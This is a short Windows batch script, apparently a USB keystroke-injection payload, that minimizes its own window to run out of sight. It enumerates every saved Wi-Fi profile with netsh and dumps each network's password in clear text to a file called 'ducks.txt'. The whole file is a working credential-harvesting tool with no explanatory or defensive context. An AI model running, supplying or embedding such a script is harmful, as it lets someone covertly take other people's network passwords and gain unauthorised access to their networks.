@echo off
setlocal enabledelayedexpansion

set OUTPUT=ducks.txt

rem --- minimize this window ---
if not "%1"=="min" start "" /min "%~f0" min & exit

echo Collecting profiles...
netsh wlan show profiles | findstr /C:"All User Profile" > profiles_tmp.txt

rem ---- WRITE HEADER WITHOUT OVERWRITING TIMESTAMP ----
> "%OUTPUT%" echo ===== DUMP START %date% %time% =====
>> "%OUTPUT%" echo WIFI PASSWORD DUMP:
>> "%OUTPUT%" echo.

for /f "tokens=1,* delims=:" %%A in (profiles_tmp.txt) do (
    set NAME=%%B
    set NAME=!NAME:~1!

    echo Dumping: !NAME!
    >> "%OUTPUT%" echo ----- !NAME! -----
    netsh wlan show profile name="!NAME!" key=clear >> "%OUTPUT%" 2>nul
    >> "%OUTPUT%" echo:
)

del profiles_tmp.txt
echo Done! Output saved to %OUTPUT%.
exit